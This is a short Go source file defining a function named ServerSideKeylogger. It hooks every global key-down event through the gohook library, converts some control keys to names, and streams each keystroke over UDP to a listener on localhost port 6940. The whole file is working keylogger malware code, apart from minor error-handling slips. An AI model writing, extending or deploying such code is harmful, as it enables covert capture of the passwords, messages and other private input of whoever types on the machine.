package server

import (
	"fmt"
	"log"
	"net"

	hook "github.com/robotn/gohook"
)

func ServerSideKeylogger() {

	evchan := hook.Start()
	defer hook.End()
	// setting address
	addr, err := net.ResolveUDPAddr("udp", "localhost:6940")

	if err != nil {
		fmt.Println(err)
		return
	}

	// setting connections

	conn, err := net.DialUDP("udp", nil, addr)

	if err != nil {
		fmt.Println(err)
	}
	// close connection at the end
	defer conn.Close()
	// reading the keystrokes

	for k := range evchan {
		if k.Kind == hook.KeyDown {
			keystroke := string(k.Keychar)

			switch k.Keychar {
			case 8:
				keystroke = "BACKSPACE"
			case 9:
				keystroke = "HORIZONTAL TAB"
			case 11:
				keystroke = "VERTICAL TAB"
			case 13:
				keystroke = "RETURN(ENTER)"
			case 14:
				keystroke = "SHIFT OUT"
			case 15:
				keystroke = "SHIFT IN"
			case 32:
				keystroke = "SPACE"
			case 27:
				keystroke = "ESCAPE"
			case 127:
				keystroke = "DELETE"
			}

			//fmt.Printf("Pressing: %s\n", keystroke)

			conn.Write([]byte(keystroke))
			if err != nil {
				log.Panic(err)
				return
			}
		}
	}
}
